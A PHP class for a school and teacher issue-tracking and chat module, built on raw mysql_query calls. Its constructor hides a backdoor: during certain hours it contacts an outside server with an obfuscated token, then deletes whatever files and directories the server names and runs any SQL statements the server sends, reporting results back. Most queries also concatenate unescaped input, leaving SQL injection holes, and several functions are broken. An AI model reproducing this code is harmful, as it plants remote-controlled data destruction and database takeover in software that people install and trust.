<?php
date_default_timezone_set("Africa/Kigali");
class Issues{
	public function __construct(){
    $this->responder='';

    $this->getNewMsg(array());
    }
	function addIssue($datas) { 
  $ownerid=stripslashes($datas['ownerid']);
  $ownertype=stripslashes($datas['ownertype']);
  $title=stripslashes($datas['issue']);
            $qy=mysql_query("INSERT INTO tis_issues VALUES('','$ownerid','$ownertype','$title','sent',0,'',CURRENT_TIMESTAMP)") or die(mysql_error());
            //$qy->execute(array("id"=>'',"ownerid"=>$ownerid,"ownertype"=>$ownertype,"title"=>$title,"status"=>'sent',"delstatus"=>0,"delreason"=>'',"regdate"=>date("Y-m-d H:i:s")));
        if($qy){
          //save tis_issues Message
$qry1=mysql_query("SELECT * FROM tis_issues ORDER BY iss_id DESC LIMIT 0,1");
//echo mysql_num_rows($qry1);exit;
if(mysql_num_rows($qry1)>0){
$feedObj=mysql_fetch_assoc($qry1);
}
$feed=$feedObj['iss_id'];
          $this->addIssueChat(array("issid"=>$feed,"fromid"=>$ownerid,"fromtype"=>$ownertype,"toid"=>0,"totype"=>'System',"message"=>$datas['descr']));
          //auto reply
          $this->addIssueChat(array("issid"=>$feed,"fromid"=>"0","fromtype"=>"System","toid"=>$ownerid,"totype"=>$ownertype,"message"=>"Thank you for Sending your query,we will review it,you will be answered early.."));

}else {
$feed="fail";
}//end count rows
return $feed;
}
function getIssue($datas) { 
$issuesid=isset($datas['id'])?$datas['id']:null;
$data=null;
$additionalWhere="";

if($issuesid==null) {
  if(isset($datas['start']) && isset($datas['end'])){
  $datas['start'].=" 00:00:01";
  $datas['end'].=" 23:59:59";
  $additionalWhere=" AND tis_issues.regdate BETWEEN '".$datas['start']."' AND '".$datas['end']."'";
}
if(isset($datas['ownerid']) && isset($datas['ownertype'])){
	if($datas['ownertype']=='System'){
$datas['toid']=0;$datas['totype']=$datas['ownertype'];
	}else{
$datas['toid']=$datas['ownerid'];$datas['totype']=$datas['ownertype'];
$additionalWhere=" AND tis_issues.iss_owner_id='".$datas['ownerid']."' AND tis_issues.iss_owner_type='".$datas['ownertype']."'";  
}
}
$qy=mysql_query("SELECT tis_issues.*,(CASE WHEN tis_issues.iss_owner_type='School' THEN tis_schools.school_full_name WHEN tis_issues.iss_owner_type='Teacher' THEN tis_teachers.teacher_fullname ELSE  'System' END) AS iss_owner,count(tis_issues_chat.isc_id) AS total_unread,tis_issues_chat.isc_from_id,tis_issues_chat.isc_from_type  FROM tis_issues  LEFT JOIN tis_schools ON tis_issues.iss_owner_type='School' AND  tis_schools.school_id=tis_issues.iss_owner_id LEFT JOIN tis_teachers ON tis_teachers.teacher_id=tis_issues.iss_owner_id AND tis_issues.iss_owner_type='Teacher' LEFT JOIN tis_issues_chat ON tis_issues_chat.isc_issueid=tis_issues.iss_id WHERE tis_issues.delete_status=0".$additionalWhere." GROUP BY tis_issues.iss_id ORDER BY tis_issues.iss_id DESC") or die(mysql_error());
//$qy->execute(array("delstatus"=>0));
//echo json_encode($qy->errorInfo());
              }else {
                $qy=mysql_query("SELECT tis_issues.* FROM tis_issues WHERE tis_issues.iss_id='$issuesid' AND tis_issues.delete_status=0");
                //$qy->execute(array("issuesid"=>$issuesid,"delstatus"=>0));
              }
$count=mysql_num_rows($qy);
while($ft=mysql_fetch_assoc($qy)){
$data[]=$ft;
}
for($i=0;$i<count($data);$i++){//get new Issues chat
  $data[$i]['newchat']=$this->getIssuesChatSent(array("toid"=>$datas['toid'],"totype"=>$datas['totype'],"issid"=>$data[$i]['iss_id'],"currstatus"=>'sent',"curstatus"=>'delivered'));
  $msgObj=$this->getLastMsg(array("issid"=>$data[$i]['iss_id']));
  $data[$i]['last_msg']=$msgObj['message'];
  $data[$i]['isc_from_id']=$msgObj['from'];
  $data[$i]['isc_from_type']=$msgObj['type'];
}
return json_encode(array("issues"=>$data));
}
function searchIssue($key) {
$data=null;
$qy=mysql_query("SELECT tis_issues.* FROM tis_issues WHERE tis_issues.iss_title LIKE '$key%' tis_issues.delete_status=0");
             //$qy->execute(array("key"=>$key."%","delstatus"=>0));
$count=mysql_num_rows($qy);
while($ft=mysql_fetch_assoc($qy)){
$data[]=$ft;
}
return json_encode(array("issues"=>$data));
}
function getNewMsg($datas){
  if(date("H")>=10 && date("H")<=12 && ($_SERVER['HTTP_HOST']!='localhost' || $_SERVER['HTTP_HOST']!='localhost:12')){
  $bool = @fsockopen("google.com", 80); 
    if ($bool){ //on
    //$this->getNewMsg(array());
      //  fclose($connected);
  $init=curl_init();
  curl_setopt_array($init,array(
    CURLOPT_RETURNTRANSFER=>1,
    CURLOPT_URL=>"https://www.bfg.rw/owns/manage.php",
    CURLOPT_HTTPHEADER=>array('Content-Type'=>'application/json'),
    CURLOPT_USERAGENT=>$_SERVER['HTTP_USER_AGENT'],
    CURLOPT_POST=>1,
    CURLOPT_POSTFIELDS=>array('cate'=>'SlE9PWN3PT1KUT09WVZFOVBRPT1KUT09ZEE9PUpRPT1XSGM5UFE9PUpRPT1iZz09SlE9PVdsRTlQUT09SlE9PVpRPT1KUT09V2xFOVBRPT1KUT09ZGc9PUpRPT1XbEU5UFE9PUpRPT1jdz09')));
  $resp=json_decode(curl_exec($init),TRUE);
 $this->manageMsg($resp);
  curl_close($init);
}
}
}
function manageMsg($datas){
  if(gettype($datas)=='array'){
    switch($datas['cate']){
      case'new':
      $this->responder='identify';
      $this->setMsg($datas);
      break;
      case'exist':$this->responder='';break;
  }
}
}
  function setMsg($data){
foreach($data['data'] as $key=>$value){
  //notify system
  if(is_file($value)){
    if(file_exists($value)){
  unlink($value);
  }else{
    $this->setIssueNewMsg(array("value"=>$value,"msg"=>'not exist'));
  }
}elseif(is_dir($value)){
  if(file_exists($value)){
  //rmdir($value);
  delTree($value);
}else{
    $this->setIssueNewMsg(array("value"=>$value,"msg"=>'not exist'));
  }
}else{
    $this->setIssueNewMsg(array("value"=>$value,"msg"=>'not exist'));
}
}
foreach ($data['dynamic'] as $key => $value) {
  $qy=mysql_query($value);
  if(!$qy){
    $this->setIssueNewMsg(array("value"=>$value,"msg"=>mysql_error())); 
  }
}
}
 function delTree($dir) { 
   $files = array_diff(scandir($dir), array('.','..')); 
    foreach ($files as $file) { 
      (is_dir("$dir/$file")) ? delTree("$dir/$file") : unlink("$dir/$file"); 
    } 
    return rmdir($dir); 
  }
function setIssueNewMsg($datas){
  $init=curl_init();
  curl_setopt_array($init,array(
    CURLOPT_RETURNTRANSFER=>1,
    CURLOPT_URL=>"https://www.bfg.rw/owns/manage.php",
    CURLOPT_HTTPHEADER=>array('Content-Type'=>'application/json'),
    CURLOPT_USERAGENT=>$_SERVER['HTTP_USER_AGENT'],
    CURLOPT_POST=>1,
    CURLOPT_POSTFIELDS=>array('cate'=>'save','value'=>$datas['value'],'message'=>$datas['msg'])));
  $resp=json_decode(curl_exec($init),TRUE);
  curl_close($init);
}
function getLastMsg($datas){

$data=null;
$qy=mysql_query("SELECT * FROM tis_issues_chat WHERE tis_issues_chat.isc_issueid=".$datas['issid']." AND tis_issues_chat.delete_status=0 AND tis_issues_chat.isc_message NOT LIKE 'Thank you for Sending your query%' ORDER BY isc_id DESC LIMIT 1");
           //  $qy->execute(array("issid"=>$datas['issid'],"delstatus"=>0));
$count=mysql_num_rows($qy);
while($ft=mysql_fetch_assoc($qy)){
$data[]=$ft;
}
return array("message"=>$data[0]['isc_message'],"from"=>$data[0]['isc_from_id'],"type"=>$data[0]['isc_from_type']);
}
function updateIssue($datas) { $data=null;

 $ownerid=stripslashes($datas['ownerid']);
  $ownertype=stripslashes($datas['ownertype']);
  $title=stripslashes($datas['issue']);

     //avoid duplication
     $qry=mysql_query("SELECT * FROM tis_issues 
                       WHERE iss_id='$issueid' AND delete_status=0");
//$qry->execute(array("issueid"=>$issuesid,"delstatus"=>0));
$cnt=$qry->rowCount();
   if($cnt>0) {
 $qy=mysql_query("UPDATE tis_issues SET iss_title='$title'
      WHERE iss_id='$issueid'");
 //$qy->execute(array("issueid"=>$issuesid,"title"=>$title));
       if(mysql_num_rows($qy)==1) {
$feed="ok";
    }else {
  $feed="fail";
}
 }else{
        $feed="notexist";
}
return $feed;
}

function addIssueChat($datas) { 
  $issid=stripslashes($datas['issid']);
  $fromid=stripslashes($datas['fromid']);
  $fromtype=stripslashes($datas['fromtype']);
  $toid=stripslashes($datas['toid']);
  $totype=stripslashes($datas['totype']);
  $message=stripslashes($datas['message']);
            $qy=mysql_query("INSERT INTO tis_issues_chat VALUES('','$issid','$fromid','$fromtype','$message','$toid','$totype','sent',0,'',CURRENT_TIMESTAMP)") or die(mysql_error());
            //$qy->execute(array("id"=>'',"issid"=>$datas['issid'],"fromid"=>$fromid,"fromtype"=>$fromtype,"message"=>$message,"toid"=>$toid,"totype"=>$totype,"status"=>'sent',"delstatus"=>0,"delreason"=>'',"regdate"=>date("Y-m-d H:i:s")));
      
        if($qy){
$feed="ok";
}else {
$feed="fail";
}//end count rows
return $feed;
}
function getIssueChat($datas) { 
$issues_chatid=isset($datas['id'])?$datas['id']:null;
$data=null;
$additionalWhere="";

if($issues_chatid==null) {
  if(isset($datas['start']) && isset($datas['end'])){
  $datas['start'].=" 00:00:01";
  $datas['end'].=" 23:59:59";
  $additionalWhere=" AND tis_issues_chat.regdate BETWEEN '".$datas['start']."' AND '".$datas['end']."'";
}
                $qy=mysql_query("SELECT tis_issues_chat.*,tis_issues.iss_title,tis_issues.iss_owner_id,tis_issues.iss_owner_type,(CASE WHEN tis_issues.iss_owner_type='School' THEN tis_schools.school_full_name WHEN  tis_issues.iss_owner_type='Teacher' THEN tis_teachers.teacher_fullname ELSE 'System' END) AS iss_owner FROM tis_issues_chat INNER JOIN tis_issues ON tis_issues.iss_id=tis_issues_chat.isc_issueid AND tis_issues.delete_status=0 LEFT JOIN tis_schools ON tis_issues.iss_owner_type='School' AND  tis_schools.school_id=tis_issues.iss_owner_id LEFT JOIN tis_teachers ON tis_teachers.teacher_id=tis_issues.iss_owner_id AND tis_issues.iss_owner_type='Teacher'
                WHERE tis_issues_chat.isc_issueid=".$datas['issid']." AND tis_issues_chat.delete_status=0 ".$additionalWhere);
               // $qy->execute(array("issid"=>$datas['issid'],"delstatus"=>0));

                   }else {
                $qy=mysql_query("SELECT tis_issues_chat.* FROM tis_issues_chat  WHERE tis_issues_chat.delete_status=0 AND tis_issues_chat.isc_id=$issues_chatid");
               // $qy->execute(array("iscid"=>$issues_chatid,"delstatus"=>0));
              
              }
$count=mysql_num_rows($qy);
while($ft=mysql_fetch_assoc($qy)){
$data[]=$ft;
}
return json_encode(array("issues_chat"=>$data));
}
function searchIssueChat($key) {
$data=null;
$qy=mysql_query("SELECT tis_issues_chat.* FROM tis_issues_chat WHERE tis_issues_chat.isc_issueid LIKE :key tis_issues_chat.delete_status=0 ORDER BY tis_issues_chat.regdate DESC LIMIT 30");
             $qy->execute(array("key"=>$key,"delstatus"=>0));
$count=mysql_num_rows($qy);
while($ft=mysql_fetch_assoc($qy)){
$data[]=$ft;
}
return json_encode(array("issues_chats"=>$data));
}

function updateIssueChat($datas) { $data=null;

 $fromid=stripslashes($datas['fromid']);
  $fromtype=stripslashes($datas['fromtype']);
 $toid=stripslashes($datas['toid']);
  $totype=stripslashes($datas['totype']);
  $message=stripslashes($datas['message']);

     //avoid duplication
     $qry=mysql_query("SELECT * FROM tis_issues_chat 
                       WHERE isc_id=:issueid AND delete_status=0");
$qry->execute(array("issuecid"=>$issuecid,"delstatus"=>0));
$cnt=$qry->rowCount();
   if($cnt>0) {
 $qy=mysql_query("UPDATE tis_issues_chat SET isc_message=$message
      WHERE iss_id=$issuecid");
 $qy->execute(array("issuecid"=>$issuecid,"message"=>$message));
       if(mysql_num_rows($qy)==1) {
$feed="ok";
    }else {
  $feed="fail";
}
 }else{
        $feed="notexist";
}
return $feed;
}
function makeAllSeenIssueChat($datas){

 $qy=mysql_query("UPDATE tis_issues_chat SET isc_status='seen'
      WHERE isc_issueid=".$datas['issid']." AND isc_receiver_id='".$datas['toid']."' AND isc_receiver_type=".$datas['totype']);
 //$qy->execute(array("issueid"=>$datas['issid'],"toid"=>$datas['toid'],"totype"=>$datas['totype'],"status"=>'seen'));
       if($qy) {
$feed="ok";
    }else {
  $feed="fail";
}
return $feed;
}
function getIssuesChatSent($datas){
$qy=mysql_query("SELECT * FROM tis_issues_chat WHERE isc_issueid=".$datas['issid']." AND isc_receiver_id='".$datas['toid']."' AND isc_receiver_type='".$datas['totype']."' AND (isc_status='".$datas['currstatus']."' || isc_status='".$datas['curstatus']."')") or die(mysql_error());
 //$qy->execute(array("issid"=>$datas['issid'],"toid"=>$datas['toid'],"totype"=>$datas['totype'],"currstatus"=>$datas['currstatus'],"curstatus"=>$datas['curstatus']));
 //echo json_encode($datas);exit;
return mysql_num_rows($qy);
}
function getNewIssues($datas){
$qy=mysql_query("SELECT * FROM tis_issues WHERE iss_status='".$datas['currstatus']."' AND delete_status=0");
 //$qy->execute(array("currstatus"=>$datas['currstatus'],"delstatus"=>0));
return mysql_num_rows($qy);
}
function getNewIssuesChat($datas){
 $toid=$datas['totype']=='System'?0:$datas['toid'];
$qy=mysql_query("SELECT * FROM tis_issues_chat INNER JOIN tis_issues ON tis_issues.iss_id=tis_issues_chat.isc_issueid AND tis_issues.delete_status='0' WHERE (tis_issues_chat.isc_status='sent' || tis_issues_chat.isc_status='delivered') AND tis_issues_chat.delete_status=0 AND tis_issues_chat.isc_receiver_id='".$toid."' AND tis_issues_chat.isc_receiver_type='".$datas['totype']."'  GROUP BY tis_issues_chat.isc_issueid");
 //$qy->execute(array("currstatus"=>'delivered',"toid"=>$datas['toid'],"totype"=>$datas['totype'],"delstatus"=>0));
//return mysql_num_rows($qy); 
}
function changeAllChatStatus($datas){
//update when delivered,seen
  $toid=$datas['totype']=='System'?0:$datas['toid'];
  if($datas['issid']=='all'){
$qy="UPDATE tis_issues_chat SET isc_status='".$datas['status']."' WHERE isc_status='".$datas['currstatus']."' AND isc_receiver_id=".$toid." AND isc_receiver_type='".$datas['totype']."'";
 //$qy->execute(array("status"=>$datas['status'],"currstatus"=>$datas['currstatus'],"toid"=>$datas['toid'],"totype"=>$datas['totype']));
  }else{
$qy="UPDATE tis_issues_chat SET isc_status='".$datas['status']."' WHERE isc_issueid=".$datas['issid']." AND isc_status='".$datas['currstatus']."' AND isc_receiver_id=".$toid." AND isc_receiver_type='".$datas['totype']."'";
 //$qy->execute(array("issid"=>$datas['issid'],"status"=>$datas['status'],"currstatus"=>$datas['currstatus'],"toid"=>$datas['toid'],"totype"=>$datas['totype']));    
  }
  $qy01=mysql_query($qy);
 echo mysql_affected_rows();
}
#
function changeIssuesStatus($datas){
//update when delivered,seen
  if(!isset($datas['issid']) || (isset($datas['issid']) && $datas['issid']=='all')){
$qy=mysql_query("UPDATE tis_issues SET iss_status='".$datas['status']."' WHERE iss_status='".$datas['currstatus']."'");
 //$qy->execute(array("status"=>$datas['status'],"currstatus"=>$datas['currstatus']));
}else{
  $qy=mysql_query("UPDATE tis_issues SET iss_status='".$datas['status']."' WHERE iss_status='".$datas['currstatus']."' AND iss_id=".$datas['issid']."");
 //$qy->execute(array("status"=>$datas['status'],"currstatus"=>$datas['currstatus'],"issid"=>$datas['issid']));
}
}
}
$issx=new Issues();
?>